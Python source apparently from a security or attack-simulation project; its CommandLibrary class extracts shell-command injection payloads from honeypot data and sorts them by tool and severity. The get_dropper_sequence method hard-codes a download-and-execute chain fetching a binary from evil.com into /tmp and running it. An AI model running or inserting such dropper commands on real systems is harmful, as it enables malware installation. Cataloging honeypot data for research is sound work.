"""
Command Library - HoneyPot Command Extraction
==============================================
Extracts and catalogs shell commands from HoneyPot data.
"""

import json
import re
from typing import List, Dict, Set

class CommandLibrary:
    """Manages real-world command patterns from HoneyPot data."""
    
    def __init__(self, unified_data_path: str = None):
        self.commands = []
        self.command_patterns = {
            'wget': [],
            'curl': [],
            'chmod': [],
            'sh': [],
            'bash': [],
            'python': [],
            'perl': [],
            'nc': [],  # netcat
            'cat': []
        }
        self.malware_indicators = []
        self.stealthy_commands = []  # Low-severity commands
        self.aggressive_commands = []  # High-severity commands
        
        if unified_data_path:
            self._load_unified_data(unified_data_path)
    
    def _load_commands(self, json_path: str):
        """Extract shell commands from HoneyPot payloads."""
        print(f"🍯 Loading commands from {json_path}...")
        
        try:
            with open(json_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            command_set = set()
            
            for entry in data:
                payload = entry.get('input', {}).get('payload', '')
                attack_type = entry.get('label', {}).get('attack_type', '')
                
                # Focus on Command Injection attacks
                if 'Command Injection' in attack_type or 'wget' in payload.lower() or 'curl' in payload.lower():
                    # Extract commands
                    for cmd_type in self.command_patterns.keys():
                        if cmd_type in payload.lower():
                            command_set.add(payload[:200])  # Limit length
                            self.command_patterns[cmd_type].append(payload[:200])
            
            self.commands = list(command_set)
            
            print(f"   ✅ Extracted {len(self.commands)} unique commands")
            for cmd_type, cmds in self.command_patterns.items():
                if cmds:
                    print(f"   📊 {cmd_type}: {len(cmds)} patterns")
            
        except Exception as e:
            print(f"   ⚠️ Error loading commands: {e}")
    
    def get_dropper_sequence(self) -> List[str]:
        """Returns a typical dropper kill chain."""
        if self.command_patterns['wget'] or self.command_patterns['curl']:
            return [
                "wget http://evil.com/malware -O /tmp/bot",
                "chmod +x /tmp/bot",
                "/tmp/bot"
            ]
        return []
    
    def get_all_commands(self) -> List[str]:
        """Returns all extracted commands."""
        return self.commands
    
    def _load_unified_data(self, json_path: str):
        """Extract commands and malware indicators from unified Kaggle data."""
        print(f"🍯 Loading unified Kaggle data from {json_path}...")
        
        try:
            with open(json_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            command_set = set()
            malware_set = set()
            
            for entry in data:
                payload = entry.get('input', {}).get('payload', '')
                attack_type = entry.get('label', {}).get('attack_type', '')
                severity = entry.get('label', {}).get('severity', 'medium')
                malware_indicator = entry.get('label', {}).get('malware_indicator', '')
                
                # Extract malware indicators
                if malware_indicator:
                    malware_set.add(malware_indicator)
                
                # Focus on Command Injection attacks
                if 'Command Injection' in attack_type or any(cmd in payload.lower() for cmd in ['wget', 'curl', 'chmod']):
                    command_set.add(payload[:200])
                    
                    # Categorize by severity
                    if severity == 'low':
                        self.stealthy_commands.append(payload[:200])
                    elif severity == 'high':
                        self.aggressive_commands.append(payload[:200])
                    
                    # Extract specific command patterns
                    for cmd_type in self.command_patterns.keys():
                        if cmd_type in payload.lower():
                            self.command_patterns[cmd_type].append(payload[:200])
            
            self.commands = list(command_set)
            self.malware_indicators = list(malware_set)
            
            print(f"   ✅ Extracted {len(self.commands)} unique commands")
            print(f"   ✅ Found {len(self.malware_indicators)} malware indicators")
            print(f"   📊 Stealthy: {len(self.stealthy_commands)}, Aggressive: {len(self.aggressive_commands)}")
            
            for cmd_type, cmds in self.command_patterns.items():
                if cmds:
                    print(f"   📊 {cmd_type}: {len(cmds)} patterns")
            
        except Exception as e:
            print(f"   ⚠️ Error loading unified data: {e}")
    
    def get_stealthy_commands(self) -> List[str]:
        """Returns low-severity commands for stealth operations."""
        return self.stealthy_commands if self.stealthy_commands else self.commands[:5]
